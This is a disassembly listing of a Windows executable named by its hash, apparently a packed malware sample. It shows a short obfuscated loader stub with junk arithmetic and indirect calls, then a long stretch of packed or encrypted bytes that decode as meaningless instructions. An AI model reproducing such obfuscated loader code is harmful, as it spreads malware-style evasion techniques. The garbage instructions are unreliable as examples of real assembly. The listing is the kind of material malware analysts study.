
82d62af86a066277aa3babd0556889026d97aa6826edc150d75117f5f32d2956.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0xb4
  401009:	mov    eax,DWORD PTR [ebp+0x8]
  40100c:	adc    ecx,0x2570
  401012:	push   ebx
  401013:	adc    DWORD PTR ds:0x42a292,ecx
  401019:	push   esi
  40101a:	mov    DWORD PTR ds:0x42a266,0x13
  401024:	cmp    DWORD PTR ds:0x42a266,0x0
  40102b:	je     0x401070
  401031:	cmp    DWORD PTR ds:0x42a266,0x23
  401038:	jg     0x401070
  40103e:	jmp    0x40105e
  401043:	push   0x1
  401045:	push   0x4b7c
  40104a:	push   DWORD PTR [ebp-0x28]
  40104d:	push   DWORD PTR [ebp-0x1c]
  401050:	push   0x4108
  401055:	push   DWORD PTR [ebp-0xc]
  401058:	call   DWORD PTR ds:0x42a3c2
  40105e:	mov    ecx,DWORD PTR ds:0x42a266
  401064:	dec    ecx
  401065:	mov    DWORD PTR ds:0x42a266,ecx
  40106b:	jmp    0x401024
  401070:	push   edi
  401071:	mov    esi,0x75108aa
  401076:	sbb    DWORD PTR ds:0x42a266,0x4c4b
  401080:	xor    eax,esi
  401082:	and    DWORD PTR ds:0x42a26e,0x59cd
  40108c:	mov    edi,0x3272f1
  401091:	mov    ecx,DWORD PTR ds:0x42a26a
  401097:	sbb    ecx,DWORD PTR ds:0x42a2aa
  40109d:	mov    DWORD PTR ds:0x42a26a,ecx
  4010a3:	add    eax,edi
  4010a5:	and    DWORD PTR ds:0x42a296,0x0
  4010af:	jmp    0x4010c3
  4010b4:	xor    ecx,ecx
  4010b6:	xor    ecx,DWORD PTR ds:0x42a296
  4010bc:	inc    ecx
  4010bd:	mov    DWORD PTR ds:0x42a296,ecx
  4010c3:	cmp    DWORD PTR ds:0x42a296,0x1e
  4010ca:	jae    0x401113
  4010d0:	cmp    DWORD PTR ds:0x42a296,0xe
  4010d7:	ja     0x401113
  4010dd:	jmp    0x4010f2
  4010e2:	push   0x42a25e
  4010e7:	push   0x42916d
  4010ec:	call   DWORD PTR ds:0x42a3ca
  4010f2:	cmp    DWORD PTR ds:0x42a296,0xd
  4010f9:	jne    0x40110e
  4010ff:	xor    ecx,ecx
  401101:	or     ecx,DWORD PTR ds:0x42a296
  401107:	inc    ecx
  401108:	mov    DWORD PTR ds:0x42a296,ecx
  40110e:	jmp    0x4010b4
  401113:	mov    DWORD PTR [ebp-0x40],eax
  401116:	mov    eax,ds:0x42a2ca
  40111b:	sbb    DWORD PTR ds:0x42a25a,eax
  401121:	mov    eax,ds:0x42929e
  401126:	sub    DWORD PTR ds:0x42a2fa,ecx
  40112c:	mov    eax,DWORD PTR [eax]
  40112e:	mov    DWORD PTR [ebp-0x3c],eax
  401131:	inc    eax
  401132:	mov    eax,ds:0x4294ae
  401137:	and    DWORD PTR ds:0x42a26a,0x0
  401141:	jmp    0x401153
  401146:	mov    ecx,DWORD PTR ds:0x42a26a
  40114c:	inc    ecx
  40114d:	mov    DWORD PTR ds:0x42a26a,ecx
  401153:	cmp    DWORD PTR ds:0x42a26a,0x1f
  40115a:	jae    0x40119f
  401160:	cmp    DWORD PTR ds:0x42a26a,0x4
  401167:	jge    0x40119f
  40116d:	jmp    0x401180
  401172:	push   DWORD PTR [ebp-0x18]
  401175:	push   0x42a2c6
  40117a:	call   DWORD PTR ds:0x42a3ce
  401180:	cmp    DWORD PTR ds:0x42a26a,0x3
  401187:	jne    0x40119a
  40118d:	mov    ecx,DWORD PTR ds:0x42a26a
  401193:	inc    ecx
  401194:	mov    DWORD PTR ds:0x42a26a,ecx
  40119a:	jmp    0x401146
  40119f:	mov    eax,DWORD PTR [eax]
  4011a1:	add    ecx,0x507d
  4011a7:	mov    DWORD PTR [ebp-0x1c],eax
  4011aa:	xor    ecx,0x7815
  4011b0:	mov    DWORD PTR [ebp-0x34],0xf89c87a5
  4011b7:	or     DWORD PTR ds:0x42a2da,0x4fa4
  4011c1:	mov    eax,DWORD PTR [ebp-0x34]
  4011c4:	xor    eax,esi
  4011c6:	sub    ecx,DWORD PTR ds:0x42a2ce
  4011cc:	add    eax,edi
  4011ce:	and    DWORD PTR ds:0x42a266,edi
  4011d4:	mov    DWORD PTR [ebp-0x40],eax
  4011d7:	mov    eax,ds:0x42941e
  4011dc:	mov    DWORD PTR [ebp-0x40],eax
  4011df:	xor    eax,0x2e62
  4011e4:	mov    eax,DWORD PTR [ebp-0x3c]
  4011e7:	mov    DWORD PTR [ebp-0x14],eax
  4011ea:	and    DWORD PTR ds:0x42a2de,0x0
  4011f4:	xor    ecx,ecx
  4011f6:	xor    ecx,DWORD PTR ds:0x42a2de
  4011fc:	inc    ecx
  4011fd:	mov    DWORD PTR ds:0x42a2de,ecx
  401203:	cmp    DWORD PTR ds:0x42a2de,0xb
  40120a:	ja     0x401250
  401210:	jmp    0x401229
  401215:	push   DWORD PTR [ebp-0x14]
  401218:	push   0x42a25e
  40121d:	push   DWORD PTR [ebp-0x18]
  401220:	push   DWORD PTR [ebp-0x20]
  401223:	call   DWORD PTR ds:0x42a3d2
  401229:	cmp    DWORD PTR ds:0x42a2de,0xa
  401230:	jne    0x401243
  401236:	mov    ecx,DWORD PTR ds:0x42a2de
  40123c:	inc    ecx
  40123d:	mov    DWORD PTR ds:0x42a2de,ecx
  401243:	cmp    DWORD PTR ds:0x42a2de,0x12
  40124a:	jb     0x4011f4
  401250:	mov    eax,DWORD PTR [ebp-0x14]
  401253:	adc    DWORD PTR ds:0x42a2ee,edx
  401259:	push   0x4
  40125b:	pop    ecx
  40125c:	or     DWORD PTR ds:0x42a256,0x42a2ba
  401266:	sub    ecx,eax
  401268:	and    DWORD PTR ds:0x42a2ae,edx
  40126e:	add    ecx,DWORD PTR [ebp-0x1c]
  401271:	sub    DWORD PTR ds:0x42a25a,0x29a3
  40127b:	mov    DWORD PTR [ebp-0x2c],0xf89c85e5
  401282:	adc    DWORD PTR ds:0x42a2ba,0x27f4
  40128c:	mov    DWORD PTR [ebp-0x18],ecx
  40128f:	xor    eax,eax
  401291:	xor    eax,DWORD PTR ds:0x42a2c2
  401297:	or     DWORD PTR ds:0x42a276,eax
  40129d:	jmp    0x4035f6
  4012a2:	scas   eax,DWORD PTR es:[edi]
  4012a3:	cdq    
  4012a4:	and    DWORD PTR [ebx],edx
  4012a6:	add    DWORD PTR [ebx+0x10ba9981],ecx
  4012ac:	cwde   
  4012ad:	int    0x43
  4012af:	sbb    BYTE PTR [ebp-0x7c7c7ce0],ah
  4012b5:	add    DWORD PTR [edi+0x5e],0xffffff83
  4012b9:	and    DWORD PTR [ebp*1+0x34203826],0x22
  4012c1:	cs je  0x401301
  4012c4:	jo     0x40133d
  4012c6:	aad    0x77
  4012c8:	jae    0x40133d
  4012ca:	ins    BYTE PTR es:[edi],dx
  4012cb:	dec    ebx
  4012cc:	aam    0xdd
  4012ce:	clc    
  4012cf:	imul   edx,DWORD PTR [ecx+0x72],0x79a96278
  4012d6:	ins    BYTE PTR es:[edi],dx
  4012d7:	pusha  
  4012d8:	into   
  4012d9:	pop    esp
  4012da:	push   ebx
  4012db:	cmp    DWORD PTR [ebp+0x66879603],ecx
  4012e1:	dec    esp
  4012e2:	jle    0x40132a
  4012e4:	mov    DWORD PTR [edi+0x42bbb97e],esi
  4012ea:	sub    eax,0x3dd77fe
  4012ef:	push   0x7e
  4012f1:	pop    ds
  4012f2:	in     al,dx
  4012f3:	inc    eax
  4012f4:	int3   
  4012f5:	ret    
  4012f6:	in     al,dx
  4012f7:	xchg   esi,eax
  4012f8:	sub    bl,bh
  4012fa:	xchg   edx,eax
  4012fb:	xor    BYTE PTR [esi],cl
  4012fd:	pusha  
  4012fe:	mov    dl,0x93
  401300:	aad    0x6
  401302:	ins    BYTE PTR es:[edi],dx
  401303:	fcom   QWORD PTR ds:0x37030fe5
  401309:	and    DWORD PTR [ecx+0xd],edx
  40130c:	aaa    
  40130d:	jb     0x401380
  40130f:	shr    BYTE PTR [esi-0x48eba7d6],0xfe
  401316:	lock push eax
  401318:	xor    al,BYTE PTR [ebp+0x62d14b]
  40131e:	and    eax,DWORD PTR [ebx]
  401320:	cmp    DWORD PTR [eax+0x5ea1dc7a],0x2516b892
  40132a:	fwait
  40132b:	dec    eax
  40132c:	or     bl,BYTE PTR [edi+0x128a8b3d]
  401332:	jecxz  0x401360
  401334:	imul   ecx,DWORD PTR [ebp+eax*2-0x31059ab6],0xffffff93
  40133c:	xor    BYTE PTR [eax-0x6e323937],dl
  401342:	push   0x4d6b54f5
  401347:	or     eax,0x1a470a3f
  40134c:	lods   al,BYTE PTR ds:[esi]
  40134d:	push   edx
  40134e:	shl    DWORD PTR [esi+0x6715d949],cl
  401354:	cld    
  401355:	imul   esp,DWORD PTR [edi-0x4c],0x0
  401359:	jno    0x401319
  40135b:	add    DWORD PTR [ebx+0x23],ebx
  40135e:	or     al,0x48
  401360:	aam    0x67
  401362:	popf   
  401363:	mov    ds:0x200487e4,al
  401368:	int3   
  401369:	push   es
  40136a:	pop    esp
  40136b:	outs   dx,BYTE PTR ds:[esi]
  40136c:	rsm    
  40136e:	pop    edi
  40136f:	push   0x383d5f01
  401374:	cdq    
  401375:	add    BYTE PTR [eax+0x39c15da6],ch
  40137b:	adc    DWORD PTR [edx],esi
  40137d:	not    BYTE PTR [ebp+0xf]
  401380:	imul   DWORD PTR [edi+ebp*4]
  401383:	int    0xf3
  401385:	sbb    BYTE PTR [edi-0x4953af0a],dh
  40138b:	mov    ds:0xce9df1f8,al
  401390:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401391:	pop    edx
  401392:	repz cmp bl,dl
  401395:	mov    eax,ds:0x67047e92
  40139a:	push   edi
  40139b:	mov    bl,BYTE PTR [edx+edx*2+0x53]
  40139f:	or     eax,0x75858552
  4013a4:	sbb    eax,0x9ae8a549
  4013a9:	lock pop ecx
  4013ab:	(bad)  
  4013ac:	rcr    DWORD PTR [esi+0x22170c5d],cl
  4013b2:	cld    
  4013b3:	sbb    DWORD PTR es:[ebx],0x31742393
  4013ba:	jmp    0xe63a13c5
  4013bf:	add    eax,0xca87a808
  4013c4:	cli    
  4013c5:	jnp    0x4013e5
  4013c7:	popa   
  4013c8:	outs   dx,BYTE PTR ds:[esi]
  4013c9:	jg     0x4013a0
  4013cb:	push   edx
  4013cc:	ins    BYTE PTR es:[edi],dx
  4013cd:	mov    ecx,0xf7ebbb86
  4013d2:	fimul  DWORD PTR [ecx-0x5b]
  4013d5:	push   es
  4013d6:	xchg   BYTE PTR gs:[ecx+0x42],cl
  4013da:	mov    DWORD PTR [ebx-0x2b],ecx
  4013dd:	adc    bh,bh
  4013df:	xor    DWORD PTR [eax],ebp
  4013e1:	mov    eax,0x7efd4e8
  4013e6:	dec    ebp
  4013e7:	jmp    0x2516d53c
  4013ec:	adc    eax,0x39bd73e
  4013f1:	push   es
  4013f2:	or     al,0xcf
  4013f4:	into   
  4013f5:	sub    bh,BYTE PTR [edx-0x36]
  4013f8:	out    dx,al
  4013f9:	xor    ebx,ebx
  4013fb:	jge    0x40139e
  4013fd:	loop   0x4013f1
  4013ff:	addr16 mov edx,gs
  401402:	xchg   ecx,eax
  401403:	mov    dh,0x13
  401405:	add    ebp,DWORD PTR [eax-0x77]
  401408:	pop    edi
  401409:	xor    dl,bl
  40140b:	ds push ebp
  40140d:	jle    0x40146f
  40140f:	or     eax,0x8146089f
  401414:	arpl   WORD PTR [ecx-0x3031c4fc],bx
  40141a:	mov    ebx,0x8d7d9036
  40141f:	fidiv  WORD PTR [eax+0x7c4f3224]
  401425:	fist   DWORD PTR [ebp+0x6fff6b3]
  40142b:	lea    edi,[esi-0x5c]
  40142e:	xchg   ebx,eax
  40142f:	xchg   esi,eax
  401430:	fisubr DWORD PTR [esi]
  401432:	jne    0x401461
  401434:	ins    BYTE PTR es:[edi],dx
  401435:	xchg   edi,eax
  401436:	(bad)
  401439:	push   ds
  40143a:	repnz xchg edx,eax
  40143c:	aad    0x92
  40143e:	test   DWORD PTR [esi],ebx
  401440:	and    ebp,0x78dea7cc
  401446:	fmul   QWORD PTR [esi]
  401448:	shr    DWORD PTR [ecx],1
  40144a:	mov    dl,BYTE PTR ds:0x16adbc58
  401450:	popf   
  401451:	xchg   ebp,eax
  401452:	add    eax,0x837fbb72
  401457:	fistp  QWORD PTR [ecx]
  401459:	jle    0x40142b
  40145b:	mov    bh,0xf2
  40145d:	ret    0x1709
  401460:	pop    eax
  401461:	sbb    cl,dh
  401463:	add    dl,BYTE PTR [ecx-0xd]
  401466:	sti    
  401467:	loope  0x4013ef
  401469:	xchg   edx,eax
  40146a:	mov    al,ds:0xcfdbb80f
  40146f:	pop    esp
  401470:	jecxz  0x4013fa
  401472:	pushf  
  401473:	and    ah,BYTE PTR [edx+eax*1]
  401476:	clc    
  401477:	fisttp WORD PTR [edi+0x492e3b14]
  40147d:	jmp    0x401469
  40147f:	jl     0x401443
  401481:	test   BYTE PTR [ebx-0xd],dl
  401484:	jmp    0xbe4c:0x8a571ace
  40148b:	call   0xbefb:0xd4781b66
  401492:	ja     0x4014f6
  401494:	mov    ch,0x69
  401496:	test   ebx,0x3f9600f1
  40149c:	xor    al,BYTE PTR [edx-0x6a]
  40149f:	cld    
  4014a0:	lods   al,BYTE PTR ds:[esi]
  4014a1:	pop    ebx
  4014a2:	add    al,0x5b
  4014a4:	sub    al,0xd4
  4014a6:	aas    
  4014a7:	cli    
  4014a8:	inc    ebx
  4014a9:	es ins BYTE PTR es:[edi],dx
  4014ab:	inc    edi
  4014ac:	addr16 mov ebp,0x362fb6d1
  4014b2:	pop    ecx
  4014b3:	jae    0x40152f
  4014b5:	pop    ds
  4014b6:	mov    dl,0x5e
  4014b8:	test   edx,edi
  4014ba:	dec    edx
  4014bb:	mov    ah,BYTE PTR [ecx+0x4413f4d2]
  4014c1:	imul   ebx,DWORD PTR ds:0x177d2359,0xffffffc6
  4014c8:	sbb    al,0xb0
  4014ca:	lock push es
  4014cc:	mov    esi,0xdd897035
  4014d1:	cmp    dh,bh
  4014d3:	ret    
  4014d4:	sbb    edi,edi
  4014d6:	ror    BYTE PTR [edi+0x49782547],cl
  4014dc:	lods   al,BYTE PTR ds:[esi]
  4014dd:	cmp    esp,DWORD PTR [esi]
  4014df:	popa   
  4014e0:	fistp  DWORD PTR [eax]
  4014e2:	jae    0x4014c6
  4014e4:	jge    0x4014f4
  4014e6:	jge    0x40154e
  4014e8:	dec    esi
  4014e9:	pop    ebx
  4014ea:	addr16 push ss
  4014ec:	in     eax,0x30
  4014ee:	rcl    BYTE PTR [esi-0x48],cl
  4014f1:	nop
  4014f2:	sbb    edx,DWORD PTR [esi]
  4014f4:	adc    eax,DWORD PTR [ecx+eax*2+0x2a]
  4014f8:	pop    edi
  4014f9:	cli    
  4014fa:	out    dx,al
  4014fb:	xlat   BYTE PTR ds:[ebx]
  4014fc:	(bad)  
  4014fd:	pop    esi
  4014fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4014ff:	dec    eax
  401500:	jb     0x40153c
  401502:	hlt    
  401503:	aam    0xfa
  401505:	outs   dx,BYTE PTR ds:[esi]
  401506:	mov    al,ds:0xb3be7fe2
  40150b:	fwait
  40150c:	int3   
  40150d:	and    al,0x66
  40150f:	jmp    0x4014c1
  401511:	test   al,0x8d
  401514:	push   esi
  401515:	add    eax,0x20fe305d
  40151a:	jo     0x4014ef
  40151c:	dec    esp
  40151d:	mov    edi,0xa0cc3eaf
  401522:	test   esp,0x4330fdf6
  401528:	jl     0x40159b
  40152a:	sub    al,0x86
  40152c:	mov    cs,WORD PTR ds:0xbdb641f2
  401532:	inc    edx
  401533:	sub    al,0x88
  401535:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401536:	sub    eax,0xd94d71c4
  40153b:	add    eax,0x628fe48d
  401540:	pop    edi
  401541:	sub    ecx,esi
  401543:	dec    ecx
  401544:	mov    WORD PTR [edx+0x49],ds
  401547:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401548:	scas   al,BYTE PTR es:[edi]
  401549:	adc    ah,bh
  40154b:	and    BYTE PTR [ebx],dh
  40154d:	arpl   ax,di
  40154f:	arpl   cx,bx
  401551:	repnz pushw 0x4829
  401556:	mov    dh,BYTE PTR [edi+0x784c69c1]
  40155c:	push   ebp
  40155d:	push   esi
  40155e:	das    
  40155f:	xchg   esp,eax
  401560:	mov    ecx,0x34e5b5ef
  401565:	sub    cl,BYTE PTR [eax+0x2351de85]
  40156b:	cmc    
  40156c:	in     al,dx
  40156d:	xlat   BYTE PTR ds:[ebx]
  40156e:	stos   BYTE PTR es:[edi],al
  40156f:	cs push ss
  401571:	jecxz  0x40156c
  401573:	test   al,0xbb
  401575:	fwait
  401576:	lea    edx,[edi]
  401578:	sub    DWORD PTR [ebp+0x1f],esp
  40157b:	aam    0xb4
  40157d:	mov    WORD PTR [esi],?
  40157f:	imul   ebp,DWORD PTR [edi-0xb23ccdb],0x38
  401586:	mov    ds:0x8a93ea1,eax
  40158b:	xor    BYTE PTR [eax+0x7c00438e],0x1d
  401592:	pop    ebx
  401593:	f2xm1  
  401595:	dec    ebx
  401596:	cmp    DWORD PTR [edi+0x7c15e1fb],edx
  40159c:	pop    esp
  40159d:	sbb    BYTE PTR [edx-0x15],dh
  4015a0:	out    0x79,eax
  4015a2:	je     0x4015c5
  4015a4:	jle    0x401602
  4015a6:	in     eax,dx
  4015a7:	mov    ch,0x0
  4015a9:	(bad)  
  4015aa:	mov    eax,0xdcd680e5
  4015af:	pop    esi
  4015b0:	sub    bl,0x2e
  4015b3:	jl     0x401626
  4015b5:	jmp    0x401554
  4015b7:	retf   0x77b9
  4015ba:	(bad)  
  4015bb:	push   edi
  4015bc:	cdq    
  4015bd:	pop    ebp
  4015be:	mov    bh,0x32
  4015c0:	sub    eax,0x7c4ded0c
  4015c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4015c6:	shr    DWORD PTR [esi-0x33],cl
  4015c9:	hlt    
  4015ca:	mov    bl,0x4c
  4015cc:	pushf  
  4015cd:	dec    esi
  4015ce:	js     0x4015b3
  4015d0:	mov    WORD PTR [edx],ds
  4015d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4015d3:	cmp    BYTE PTR [edi-0x4c5068a1],bh
  4015d9:	add    ebp,DWORD PTR [edi]
  4015db:	push   cs
  4015dc:	mov    esi,0xf792f1cc
  4015e1:	call   0xd1acaaaf
  4015e6:	stos   DWORD PTR es:[edi],eax
  4015e7:	loop   0x401579
  4015e9:	sub    esp,DWORD PTR [ecx+0x72]
  4015ec:	inc    eax
  4015ed:	mov    WORD PTR [esi],ds
  4015ef:	repz push ecx
  4015f1:	pusha  
  4015f2:	sub    DWORD PTR [edx-0x41ecbe0c],eax
  4015f8:	je     0x401679
  4015fa:	jmp    0x5357:0xb969f657
  401601:	std    
  401602:	and    ch,BYTE PTR [edi]
  401604:	pop    edx
  401605:	xor    eax,0xbf05cd6a
  40160a:	fadd   QWORD PTR [edi+0x43]
  40160d:	pop    ss
  40160e:	cmp    ax,WORD PTR [esi+ecx*1+0x2b]
  401613:	ret    
  401614:	je     0x40159b
  401616:	adc    bh,dl
  401618:	mov    esp,0x6b90aad4
  40161d:	pop    ebp
  40161e:	sbb    al,0x62
  401620:	pop    edi
  401621:	fdivr  DWORD PTR [esi+ebp*8+0x5b]
  401625:	or     BYTE PTR [esi],bh
  401627:	mov    ebx,0x1b487ee8
  40162c:	mov    bl,0x6c
  40162e:	sahf   
  40162f:	jo     0x401631
  401631:	dec    edx
  401632:	nop
  401633:	mov    edx,0x55352e81
  401638:	clc    
  401639:	iret   
  40163a:	mov    esp,0x9457723d
  40163f:	jmp    0xa7be:0x4c0dc18e
  401646:	repz sub eax,0x275d24f5
  40164c:	loope  0x4016cc
  40164e:	adc    eax,0x8a5d799e
  401653:	cmp    dl,BYTE PTR [eax+0x8]
  401656:	adc    edx,eax
  401658:	jno    0x4015dd
  40165a:	aam    0xad
  40165c:	cmp    bh,bh
  40165e:	push   ebx
  40165f:	std    
  401660:	cmp    cl,ah
  401662:	inc    esp
  401663:	mov    ebx,0x18362e2
  401668:	sub    DWORD PTR [ebx],eax
  40166a:	xchg   BYTE PTR [ecx],ah
  40166c:	loope  0x40163e
  40166e:	jl     0x401617
  401670:	inc    ebx
  401671:	or     BYTE PTR [ecx],dl
  401673:	inc    esp
  401674:	pop    esp
  401675:	add    BYTE PTR [edi-0x71dd6723],ah
  40167b:	mov    ds:0x8d094e10,al
  401680:	ja     0x4016af
  401682:	jno    0x401691
  401684:	or     edx,DWORD PTR [eax+0x6f]
  401687:	inc    ebp
  401688:	add    eax,DWORD PTR ss:[eax]
  40168b:	scas   al,BYTE PTR es:[edi]
  40168c:	mov    ebp,0x87540a71
  401691:	pushf  
  401692:	pop    ebp
  401693:	or     DWORD PTR [esi+0x57],esp
  401696:	xchg   DWORD PTR [edi-0x6],edx
  401699:	ret    0x2d5a
  40169c:	call   0xf0f3:0x9213f435
  4016a3:	out    0xdc,al
  4016a5:	dec    edx
  4016a6:	or     edx,DWORD PTR [edi+0xd]
  4016a9:	nop
  4016aa:	jnp    0x401662
  4016ac:	es fs ss call 0xedb136b8
  4016b4:	fcmovne st,st(4)
  4016b6:	xor    BYTE PTR [eax-0x2b],dl
  4016b9:	or     eax,0x51bea65a
  4016be:	xchg   esp,eax
  4016bf:	mov    ecx,0x86174daa
  4016c4:	call   0xf22:0x494c5623
  4016cb:	and    dh,dl
  4016cd:	mov    ecx,0x91e78ba9
  4016d2:	loop   0x401679
  4016d4:	js     0x40168b
  4016d6:	(bad)  
  4016d8:	popf   
  4016d9:	ja     0x401731
  4016db:	jns    0x4016f2
  4016dd:	call   0x6d92027f
  4016e2:	cmp    eax,0x2a23176f
  4016e7:	cdq    
  4016e8:	out    dx,al
  4016e9:	sub    eax,0x8d71b635
  4016ee:	or     bh,dl
  4016f0:	addr16 mov eax,0xfed18b6e
  4016f6:	add    eax,0xe42f6266
  4016fb:	push   ecx
  4016fc:	sub    al,0xaf
  4016fe:	push   ebx
  4016ff:	test   dh,0xa0
  401702:	out    0x4a,al
  401704:	loope  0x401781
  401706:	mov    ch,0xf3
  401708:	mov    edi,0x532f6d26
  40170d:	push   ecx
  40170e:	adc    al,0xaf
  401710:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401711:	jae    0x4016c5
  401713:	and    esp,DWORD PTR [ebx]
  401715:	add    ecx,ecx
  401717:	jge    0x401757
  401719:	iret   
  40171a:	and    al,0x64
  40171c:	mov    bl,0x4d
  40171e:	sub    bl,BYTE PTR [esp+edi*1]
  401721:	sbb    eax,0xc3ae05e3
  401726:	lods   al,BYTE PTR ds:[esi]
  401727:	bound  esi,QWORD PTR [ebx]
  401729:	call   0xc75bc67d
  40172e:	pusha  
  40172f:	mov    cl,0xc8
  401731:	je     0x40173a
  401733:	adc    al,0xf5
  401735:	sahf   
  401736:	inc    ebp
  401737:	pop    esi
  401738:	sti    
  401739:	xchg   ebx,eax
  40173a:	or     DWORD PTR [edi-0x63e78f13],esi
  401740:	jle    0x4016ca
  401742:	enter  0x5864,0xf
  401746:	inc    edi
  401747:	mov    edx,0xc8db5662
  40174c:	sbb    eax,0x83e3259f
  401751:	int    0x31
  401753:	adc    cl,BYTE PTR [edi]
  401755:	leave  
  401756:	mov    esi,0x4c2151fd
  40175b:	sbb    dh,0x97
  40175e:	add    al,0x4f
  401760:	mov    ecx,0xc4c884a9
  401765:	sub    ebx,ebx
  401767:	jp     0x4016f4
  401769:	imul   ecx,eax,0x1fb1e7d7
  40176f:	mov    esi,0x4d93a92e
  401774:	or     bl,ah
  401776:	loopne 0x40171a
  401778:	jno    0x40174f
  40177a:	fbstp  TBYTE PTR [edi-0x586a60f2]
  401780:	inc    eax
  401781:	mov    esp,0x4d088152
  401786:	xchg   BYTE PTR [eax],ah
  401788:	mov    dx,0x215e
  40178c:	push   edx
  40178d:	out    0x7e,al
  40178f:	cmp    BYTE PTR [esi+0x23c950c2],bl
  401795:	sbb    edx,DWORD PTR [edi]
  401797:	inc    ebp
  401798:	hlt    
  401799:	sbb    al,BYTE PTR [eax+0x6b492486]
  40179f:	mov    ebp,0x220fcb39
  4017a4:	mov    eax,0xf8d69505
  4017a9:	and    eax,0xd3c42b8
  4017ae:	test   DWORD PTR [edx+0x1dd0718d],ebp
  4017b4:	dec    esi
  4017b5:	bound  edi,QWORD PTR [edx-0x16]
  4017b8:	cmp    eax,0x16401ce9
  4017bd:	or     al,0xcc
  4017bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4017c0:	das    
  4017c1:	add    DWORD PTR [eax],esp
  4017c3:	xor    ebp,DWORD PTR [esi]
  4017c5:	cmp    ecx,DWORD PTR [eax+0x1e9d8b1]
  4017cb:	mov    eax,ds:0x9b2a2e21
  4017d0:	jl     0x401840
  4017d2:	pushf  
  4017d3:	cli    
  4017d4:	fiadd  WORD PTR [eax-0x2a]
  4017d7:	cmp    DWORD PTR [edi],0xffffffaa
  4017da:	mov    bh,0x55
  4017dc:	or     bl,0x3e
  4017df:	pop    eax
  4017e0:	out    0x43,eax
  4017e2:	fist   DWORD PTR [eax-0x48]
  4017e5:	dec    edx
  4017e6:	cmp    dh,ah
  4017e8:	lds    edi,FWORD PTR [esi-0x23f4edbd]
  4017ee:	out    0x17,eax
  4017f0:	pop    edi
  4017f1:	idiv   BYTE PTR [eax-0x9]
  4017f4:	inc    ebx
  4017f5:	push   0x2f2cee03
  4017fa:	jae    0x401864
  4017fc:	jg     0x40183d
  4017fe:	push   eax
  4017ff:	cmp    eax,DWORD PTR [eax]
  401801:	shl    DWORD PTR [ecx],0xb1
  401804:	out    dx,al
  401805:	loop   0x401793
  401807:	mov    al,0xb3
  401809:	cld    
  40180a:	cmp    ch,dl
  40180c:	out    0x43,eax
  40180e:	jmp    0xa8de:0x27464a11
  401815:	add    BYTE PTR [edx-0x18285fcb],0x40
  40181c:	mov    edi,0x6d9f65b0
  401821:	sbb    BYTE PTR [ecx],0xe7
  401824:	mov    ebx,0x6e1dcb88
  401829:	out    dx,eax
  40182a:	pushf  
  40182b:	push   edi
  40182c:	retf   
  40182d:	mov    dh,0xc1
  40182f:	and    ebp,ebx
  401831:	inc    esp
  401832:	mov    BYTE PTR ds:[esp+ecx*1+0x67925b05],bl
  40183a:	sub    ah,0xc7
  40183d:	jge    0x401800
  40183f:	nop
  401840:	out    dx,eax
  401841:	dec    edi
  401842:	mov    dl,0xc6
  401844:	dec    eax
  401845:	and    DWORD PTR [ebx-0x7486bbd4],edi
  40184b:	inc    edi
  40184c:	mov    DWORD PTR [edx],edi
  40184e:	pop    edi
  40184f:	or     BYTE PTR [eax+0x7f],bh
  401852:	cli    
  401853:	lds    ebx,FWORD PTR [esi]
  401855:	scas   al,BYTE PTR es:[edi]
  401856:	jl     0x4018ba
  401858:	data16 mov al,BYTE PTR ds:0xced8aea5
  40185f:	inc    eax
  401860:	outs   dx,DWORD PTR ds:[esi]
  401861:	daa    
  401862:	out    dx,eax
  401863:	xchg   DWORD PTR [bp+si-0x577f],esp
  401868:	pusha  
  401869:	pop    esi
  40186a:	mov    WORD PTR [esi+0x47],cs
  40186d:	ds out dx,eax
  40186f:	stc    
  401870:	mov    dl,0x74
  401872:	jmp    0x953e6344
  401877:	test   BYTE PTR [esi+0x40bff7db],0x84
  40187e:	sub    DWORD PTR [esi+0x42368787],esi
  401884:	pushf  
  401885:	icebp  
  401886:	mov    WORD PTR [edi+0x76],gs
  401889:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40188a:	pushf  
  40188b:	or     BYTE PTR [edi+0xc3454c7],0x39
  401892:	in     eax,dx
  401893:	in     al,dx
  401894:	mov    eax,ds:0x1611a6c5
  401899:	mov    ds:0x5c6a6d73,eax
  40189e:	dec    ecx
  40189f:	inc    ebx
  4018a0:	jmp    0x401891
  4018a2:	std    
  4018a3:	mov    cl,0xfe
  4018a5:	jo     0x401858
  4018a7:	mov    cl,BYTE PTR [ecx+0x7fce3de5]
  4018ad:	push   ebp
  4018ae:	and    ebp,eax
  4018b0:	clc    
  4018b1:	gs inc eax
  4018b3:	bound  edi,QWORD PTR [edi-0x4557002a]
  4018b9:	(bad)  
  4018ba:	xchg   ebx,eax
  4018bb:	pop    edx
  4018bc:	es enter 0xb4fc,0xe5
  4018c1:	cmp    BYTE PTR [ecx-0x7b],0x12
  4018c5:	out    dx,eax
  4018c6:	or     DWORD PTR [edi+0x3f],0x5047fe2a
  4018cd:	push   es
  4018ce:	call   0x53381939
  4018d3:	sbb    al,0xd1
  4018d5:	pop    esi
  4018d6:	pop    ebp
  4018d7:	retf   
  4018d8:	add    bh,BYTE PTR [esi-0x4f21350c]
  4018de:	jno    0x4018de
  4018e0:	pop    ds
  4018e1:	js     0x401880
  4018e3:	sub    ah,BYTE PTR [edx-0x6a75cbd5]
  4018e9:	cmp    eax,0xb263c6a5
  4018ee:	call   0x328c4cd0
  4018f3:	jmp    0xa201:0x34d5b572
  4018fa:	sub    ch,BYTE PTR [ebx]
  4018fc:	ja     0x401972
  4018fe:	or     DWORD PTR [ebx],0xffffffcf
  401901:	ss jnp 0x4018ab
  401904:	(bad)  
  401905:	dec    esi
  401906:	pop    edi
  401907:	and    eax,0xfb14c98d
  40190c:	call   0x2d6e59ee
  401911:	outs   dx,DWORD PTR ds:[esi]
  401912:	jge    0x4018a0
  401914:	ja     0x401919
  401916:	pop    esp
  401917:	lahf   
  401918:	ret    
  401919:	push   edx
  40191a:	test   bh,ah
